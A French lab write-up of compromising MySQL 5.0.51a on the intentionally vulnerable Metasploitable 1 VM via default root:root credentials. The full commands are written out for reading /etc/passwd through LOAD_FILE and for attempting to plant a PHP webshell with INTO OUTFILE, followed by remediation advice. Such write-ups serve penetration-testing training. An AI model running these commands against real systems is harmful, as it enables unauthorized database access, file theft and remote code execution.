# Write-up — MySQL 5.0.51a : compromission par identifiants par défaut (Metasploitable 1, port 3306)

Cible : `192.168.56.102` · Résultat : accès root complet à la base + **lecture et écriture
arbitraires de fichiers** sur le système via le privilège `FILE`.

> **Note réseau.** Je suis sur `vboxnet0` (cible `192.168.56.102`). Côté coéquipier (réseau
> `172.28.128.x`), remplacer l'IP — démarche identique.

---

## 1. Recon

🖥 Kali :
```bash
nmap -sC -sV -p 3306 192.168.56.102
```
Sortie (extrait) :
```
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```
→ **MySQL 5.0.51a**, version très ancienne.

## 2. Authentification avec les identifiants par défaut

🖥 Kali — première tentative avec le client `mysql` (en réalité MariaDB client, qui négocie
TLS par défaut) :
```bash
mysql -h 192.168.56.102 -u root -proot -e "SELECT VERSION();"
```
```
ERROR 2026 (HY000): TLS/SSL error: wrong version number
```
**Échec dû au client, pas à la cible** : le serveur MySQL 5.0 de 2008 ne gère pas la
négociation TLS attendue par le client MariaDB moderne de Kali. Correction — désactiver le
TLS côté client (`--ssl-mode=DISABLED` n'existe pas sur ce client, c'est `--skip-ssl`) :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT VERSION(); SELECT CURRENT_USER();"
```
```
VERSION()
5.0.51a-3ubuntu5
CURRENT_USER()
root@%
```
→ **`root:root` fonctionne**, aucune restriction d'hôte (`root@%` = connexion depuis
n'importe quelle IP acceptée).

## 3. Énumération des privilèges

🖥 Kali :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SHOW DATABASES;"
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SHOW GRANTS FOR root@'%';"
```
Sortie :
```
Database
information_schema
mysql
tikiwiki
tikiwiki195

Grants for root@%
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' ... WITH GRANT OPTION
```
→ Privilèges root complets (`ALL PRIVILEGES ... WITH GRANT OPTION`). Les bases `tikiwiki` et
`tikiwiki195` confirment le lien avec le service web déjà exploité (`tikiwiki.md`) — même
backend de données.

**Mécanisme / objectif de cette étape.** Au-delà de l'accès SQL lui-même, le privilège
`FILE_priv` (vérifié explicitement) permet de lire et écrire des fichiers **arbitraires sur le
système de fichiers**, avec les droits du processus `mysqld` — une porte de sortie hors de la
base de données :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT user, File_priv FROM mysql.user WHERE user='root';"
```
```
user	File_priv
root	Y
```

## 4. Lecture de fichiers arbitraires (LOAD_FILE)

🖥 Kali :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/etc/passwd');"
```
Sortie (extrait) :
```
root:x:0:0:root:/root:/bin/bash
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
...
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
...
```
→ `/etc/passwd` entier récupéré, confirmant les comptes `msfadmin`/`user`/`service` du labo
(déjà vus en RID cycling SMB, `samba-enum.md`) — recoupement entre deux services distincts.

## 5. Tentative d'écriture — webshell dans le DocumentRoot (échec, puis confirmation du mécanisme)

🖥 Kali — tentative d'écrire un webshell PHP directement dans le webroot TikiWiki déjà identifié :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/tikiwiki/mysqlshell.php';"
```
```
ERROR 1 (HY000) at line 1: Can't create/write to file '/var/www/tikiwiki/mysqlshell.php' (Errcode: 13)
```
**Échec** (`Errcode: 13` = *Permission denied*) : ce n'est pas un refus de privilège MySQL
(`FILE_priv` est bien accordé), mais une restriction au niveau du système de fichiers — le
compte système qui fait tourner `mysqld` n'a pas les droits d'écriture sur ce répertoire
précis. Vérification pour confirmer cette hypothèse, en écrivant dans un répertoire
accessible en écriture par tous (`/tmp`) :
```bash
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT 'test_mysql_file_priv' INTO OUTFILE '/tmp/mysql_write_test.txt';"
mysql -h 192.168.56.102 -u root -proot --skip-ssl -e "SELECT LOAD_FILE('/tmp/mysql_write_test.txt');"
```
```
LOAD_FILE('/tmp/mysql_write_test.txt')
test_mysql_file_priv
```
→ L'écriture **fonctionne** dans `/tmp` : confirme que le privilège `FILE` est bien actif en
écriture, et que l'échec précédent est localisé au seul webroot TikiWiki (permissions du
dossier, pas du privilège SQL). Sur une cible où le webroot serait accessible en écriture par
le compte MySQL, cette même technique aboutirait à un webshell et donc une RCE complète.

## 6. Preuve d'accès

```
CURRENT_USER() = root@%   (accès root complet à la base)
File_priv = Y              (lecture/écriture arbitraire de fichiers confirmée)
LOAD_FILE('/etc/passwd')   (fichier système sensible lu intégralement)
```
→ Compromission confirmée : accès root à la base de données **et** sortie de la base vers le
système de fichiers via le privilège `FILE`. Pas de shell système direct obtenu ici (contexte
webroot non accessible en écriture), mais la primitive de lecture/écriture arbitraire est un
résultat fort en soi (exfiltration de fichiers sensibles, base pour une suite d'attaque).

---

## Remédiation

- Changer le mot de passe root par défaut (`root:root`) — cause racine de cette compromission.
- Restreindre l'accès réseau à MySQL (`bind-address`, pare-feu) : un service de base de
  données ne devrait jamais être exposé directement sur un réseau non maîtrisé.
- Retirer le privilège `FILE` des comptes applicatifs : il n'est quasiment jamais nécessaire
  et transforme une injection SQL ou une compromission de compte en lecture/écriture arbitraire
  de fichiers.
- Faire tourner `mysqld` avec un compte système dédié aux droits minimaux, et s'assurer qu'il
  n'a d'accès en écriture à aucun répertoire servi par le serveur web (limite déjà en place ici
  pour le webroot, mais à vérifier systématiquement).
- Mettre à jour MySQL : la version 5.0.51a (2008) est très obsolète et hors support.

## Sources

- Session réelle (ce write-up) — recon, authentification, énumération des privilèges, lecture
  et tentative d'écriture de fichiers.

**Suite du parcours MS1 :** PostgreSQL (port 5432), `postgres:postgres`, `COPY ... TO PROGRAM`.
